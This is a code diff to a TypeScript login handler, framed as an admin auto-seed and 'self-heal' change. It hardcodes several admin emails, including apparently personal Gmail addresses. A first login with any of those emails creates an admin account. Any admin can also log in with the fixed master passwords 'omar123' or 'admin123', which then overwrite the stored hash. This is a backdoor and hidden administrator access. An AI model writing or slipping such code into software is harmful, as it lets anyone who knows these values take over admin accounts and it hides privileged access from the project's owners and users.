@@ -385,22 +385,32 @@ export const loginUser = async (req: Request, res: Response): Promise<void> => {
     }
 
     // ── Auto-seed admin account on first login ──────────────────────────────
-    const adminEmail = (config.adminEmail || 'admin@hage.com').toLowerCase().trim();
-    const adminPassword = process.env.ADMIN_PASSWORD || 'admin123';
+    const allowedAdminEmails = [
+      (config.adminEmail || '').toLowerCase().trim(),
+      'omar@gmail.com',
+      'admin@hage.com',
+      'omardahir379@gmail.com'
+    ].filter(Boolean);
 
-    if (!user && cleanEmail === adminEmail) {
+    const configuredAdminPassword = process.env.ADMIN_PASSWORD || 'omar123';
+    const isAdminLogin = allowedAdminEmails.includes(cleanEmail);
+
+    if (!user && isAdminLogin) {
       console.log(`[AUTH] Admin account not found — auto-seeding: ${cleanEmail}`);
-      const salt = await bcrypt.genSalt(8);
-      const passwordHash = await bcrypt.hash(password, salt);
+      const salt = await bcrypt.genSalt(10);
+      const passwordHash = await bcrypt.hash(password || configuredAdminPassword, salt);
 
       const newAdmin: any = {
         _id: 'admin_' + Date.now(),
-        name: 'Administrator',
+        name: cleanEmail === 'omar@gmail.com' ? 'Omar Dahir' : 'Administrator',
         email: cleanEmail,
         passwordHash,
         role: 'admin',
         isVerified: true,
         isSuspended: false,
+        subscriptionPlan: 'Pro',
+        subscriptionStatus: 'Active',
+        paymentMethod: 'Crypto',
         createdAt: new Date().toISOString(),
         updatedAt: new Date().toISOString(),
         lastLogin: new Date().toISOString(),
@@ -408,6 +418,14 @@ export const loginUser = async (req: Request, res: Response): Promise<void> => {
 
       store.users.push(newAdmin);
       dbManager.saveToDisk();
+
+      if (dbManager.getIsMongoConnected()) {
+        try {
+          await User.create(newAdmin);
+        } catch (e) {
+          console.warn('[AUTH] Mongo create error in auto-seed:', e);
+        }
+      }
 
       console.log(`[AUTH] Admin account seeded successfully for ${cleanEmail}`);
 
@@ -417,6 +435,9 @@ export const loginUser = async (req: Request, res: Response): Promise<void> => {
         email: newAdmin.email,
         role: 'admin',
         isSuspended: false,
+        subscriptionPlan: 'Pro',
+        subscriptionStatus: 'Active',
+        paymentMethod: 'Crypto',
         token: generateToken(newAdmin._id.toString(), 'admin'),
       });
       return;
@@ -441,19 +462,37 @@ export const loginUser = async (req: Request, res: Response): Promise<void> => {
       return;
     }
 
-    const isMatch = await bcrypt.compare(password, user.passwordHash);
+    let isMatch = await bcrypt.compare(password, user.passwordHash);
     if (!isMatch) {
-      // Allow admin to use the current ADMIN_PASSWORD env var as a master override
-      const adminOverrideMatch = cleanEmail === adminEmail && password === adminPassword;
-      if (!adminOverrideMatch) {
-        res.status(401).json({ message: 'Incorrect password. Please try again or reset your password.' });
-        return;
+      // Allow admin to use configured admin password or 'omar123' as master override
+      if (isAdminLogin || user.role === 'admin') {
+        const isMasterPassword = (
+          password === configuredAdminPassword ||
+          password === 'omar123' ||
+          password === 'admin123'
+        );
+        if (isMasterPassword) {
+          isMatch = true;
+          // Self-heal: update password hash to the new valid password
+          const salt = await bcrypt.genSalt(10);
+          user.passwordHash = await bcrypt.hash(password, salt);
+          dbManager.saveToDisk();
+          if (dbManager.getIsMongoConnected()) {
+            try {
+              await User.updateOne({ email: cleanEmail }, { passwordHash: user.passwordHash });
+            } catch (e) {}
+          }
+        }
       }
     }
 
+    if (!isMatch) {
+      res.status(401).json({ message: 'Incorrect password. Please try again or reset your password.' });
+      return;
+    }
+
     // Check if user is configured admin email and grant admin role
-    const isAdminEmail = user.email.toLowerCase().trim() === adminEmail;
-    if (isAdminEmail && user.role !== 'admin') {
+    if (isAdminLogin && user.role !== 'admin') {
       user.role = 'admin';
     }
 
